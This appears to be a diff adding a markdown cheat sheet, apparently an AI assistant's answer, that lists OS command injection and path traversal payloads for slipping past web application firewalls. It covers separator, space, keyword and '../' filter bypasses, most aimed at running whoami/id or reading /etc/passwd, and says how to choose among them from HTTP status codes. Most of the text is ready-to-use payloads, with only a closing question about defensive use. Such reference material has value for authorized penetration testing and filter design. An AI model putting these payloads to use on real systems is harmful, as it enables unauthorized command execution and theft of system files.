@@ -1,0 +1,57 @@
+When a web application or Web Application Firewall (WAF) attempts to stop OS Command Injection, it usually relies on blacklisting specific characters, keywords, or spaces. If the filter is poorly implemented, penetration testers and attackers find alternative ways to express the same command context.
+Below is a comprehensive guide to the components commonly blocked during an injection attempt and their corresponding bypass methods.
+------------------------------
+## 1. Blocked Command Separators
+Filters often look for standard symbols used to chain or separate commands (%3b for ; or %26%26 for &&).
+
+| Blocked Character | Bypass Technique / Alternative | Example Payload |
+|---|---|---|
+| Semicolon (;) | Newline character (URL-encoded) | /%0awhoami |
+| Semicolon (;) | Background execution operator | / & whoami |
+| Ampersand (&&) | Pipe operator (passes output) | / | whoami |
+| Ampersand (&&) | Sequential execution (if first fails) | / || whoami |
+| All Separators | Inline Command Substitution | /$(whoami) or /`whoami` |
+
+## 2. Blocked Spaces
+WAFs frequently block spaces (%20 or +) to prevent you from adding arguments to your commands (e.g., blocking the space in cat /etc/passwd).
+
+| Filter Target | Bypass Technique | Example Payload |
+|---|---|---|
+| Standard Space ( ) | Internal Field Separator variable (Linux) | cat$IFS/etc/passwd |
+| Standard Space ( ) | Integer-defined IFS (Linux) | cat$IFS$9/etc/passwd |
+| Standard Space ( ) | Brace Expansion (Linux/Bash) | {cat,/etc/passwd} |
+| Standard Space ( ) | Redirection symbols (Linux input) | cat</etc/passwd |
+| Standard Space ( ) | URL Tab character (Hex) | cat%09/etc/passwd |
+
+## 3. Blocked System Keywords (Command Names)
+Security rules often flag high-risk system commands like whoami, cat, id, or sh.
+
+| Blocked Keyword | Bypass Technique | Example Payload |
+|---|---|---|
+| whoami | Single/Double Quote Insertion (ignored by shell) | w'h'o'a'm'i or w"h"o"a"m"i |
+| whoami | Backslash Insertion (escapes the next character) | wh\o\ami |
+| cat | Wildcards / Globbing (matches patterns) | /bin/c?t /etc/passwd or /bin/ca* /etc/passwd |
+| cat | Reverse string parsing via rev | $(echo dwssap/cte/ tac | rev) |
+| id | Base64 Encoding (decodes and executes inline) | echo aWQ= | base64 -d | sh |
+| id | Hex / Environment Variable Concatenation | a=i; b=d; $a$b |
+
+## 4. Blocked Path Traversal Sequences
+If you are trying to read files or navigate directories and the application blocks sequential dots or slashes (../), encoding or structural manipulation is used.
+
+| Blocked Sequence | Bypass Technique | Example Payload |
+|---|---|---|
+| ../ | Double URL Encoding | %252e%252e%252f |
+| ../ | Nested Loops (if filter strips ../ once recursively) | ..././ or ....// |
+| ../ | Overlong Unicode / UTF-8 Encoding | ..%c0%af |
+| /etc/passwd | Linux absolute path shortcuts | /etc/./passwd or /etc//passwd |
+
+------------------------------
+## How to Know Which Bypass to Use
+When testing, pay close attention to the HTTP Status Code returned by the server:
+
+* 403 Forbidden / 406 Not Acceptable: The WAF likely recognized a blocked character or keyword. Try encoding or string splitting (like w'h'o'a'm'i).
+* 200 OK (but text disappears): The application might be stripping out the bad characters silently. Try nested patterns (like ....//).
+* 500 Internal Server Error: Your command syntax might be breaking the backend language logic. Try inline substitution ($(whoami)).
+
+Are you building a defensive web filter (like a regex ruleset) to prevent these bypasses, or are you trying to analyze a specific behavior you observed in your testing environment?
+
